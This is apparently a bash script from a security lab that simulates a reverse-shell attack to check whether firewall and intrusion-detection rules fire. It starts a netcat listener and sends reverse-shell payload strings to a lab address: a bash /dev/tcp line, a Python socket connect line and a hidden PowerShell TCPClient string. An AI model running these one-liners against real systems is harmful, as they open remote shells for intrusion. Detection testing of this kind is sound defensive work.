#!/bin/bash
# Attack Simulation 05 — Reverse Shell Beacon
# MITRE ATT&CK: T1059.004 — Command and Scripting Interpreter: Unix Shell
# Attacker: Kali (10.10.10.20) — listener
# Victim:   Workstation (10.10.20.10) — callback (simulated)
# Expected VyOS action:  BLOCK on outbound reverse connection (stateful)
# Expected Suricata SID: 9001009 (bash /dev/tcp), 9001010 (python socket)
# Expected Wazuh alert:  rule group "suricata" — trojan-activity classtype

set -euo pipefail

KALI_IP="10.10.10.20"
VICTIM_IP="10.10.20.10"
LPORT=4444
LOG_DIR="/tmp/attack-logs"
mkdir -p "$LOG_DIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo "============================================================"
echo "  ATTACK 05 — Reverse Shell (T1059.004)"
echo "  Kali listener: $KALI_IP:$LPORT"
echo "  Simulated victim callback from: $VICTIM_IP"
echo "  Time: $(date)"
echo "============================================================"

# Phase 1: Start netcat listener (background, 15s timeout)
echo "[+] Phase 1: Starting reverse shell listener on port $LPORT"
timeout 15 nc -lvnp "$LPORT" >> "$LOG_DIR/05a-listener-$TIMESTAMP.txt" 2>&1 &
LISTENER_PID=$!
echo "[*] Listener PID: $LISTENER_PID"
sleep 1

# Phase 2: Simulate bash reverse shell payload (generates Suricata detection)
# In real attack: victim would run: bash -i >& /dev/tcp/KALI_IP/LPORT 0>&1
# Here we simulate the network pattern that Suricata detects
echo "[+] Phase 2: Simulating bash reverse shell payload content"
echo "bash -i >& /dev/tcp/$KALI_IP/$LPORT 0>&1" | \
    nc -w3 "$KALI_IP" "$LPORT" 2>&1 | \
    tee "$LOG_DIR/05b-shell-payload-$TIMESTAMP.txt" || \
    echo "[NOTE] Connection to self may fail in container — Suricata sees the string"

sleep 2

# Phase 3: Python reverse shell pattern (generates SID 9001010)
echo "[+] Phase 3: Generating Python socket reverse shell content"
PYTHON_PAYLOAD="import socket,subprocess,os;s=socket.socket();s.connect(('$KALI_IP',$LPORT))"
echo "$PYTHON_PAYLOAD" | \
    nc -w3 "$KALI_IP" "$LPORT" 2>&1 | \
    tee "$LOG_DIR/05c-python-shell-$TIMESTAMP.txt" || \
    echo "[NOTE] VyOS may block outbound return connection"

# Phase 4: MSFvenom-style meterpreter connect string (detection surface)
echo "[+] Phase 4: Meterpreter connect string pattern"
echo "cmd.exe /c powershell -nop -w hidden -c \$client = New-Object System.Net.Sockets.TCPClient" | \
    nc -w3 "$KALI_IP" "$LPORT" 2>&1 | \
    tee "$LOG_DIR/05d-meterpreter-$TIMESTAMP.txt" || true

kill "$LISTENER_PID" 2>/dev/null || true

echo ""
echo "[RESULTS] Output saved to $LOG_DIR/"
echo "[EXPECTED DETECTIONS]"
echo "  Suricata SID 9001009 — bash /dev/tcp/ string in stream"
echo "  Suricata SID 9001010 — python socket.connect() string"
echo "  EVE JSON event_type: alert, classtype: trojan-activity"
echo "  Wazuh alert: suricata rule group, severity high"
echo "============================================================"
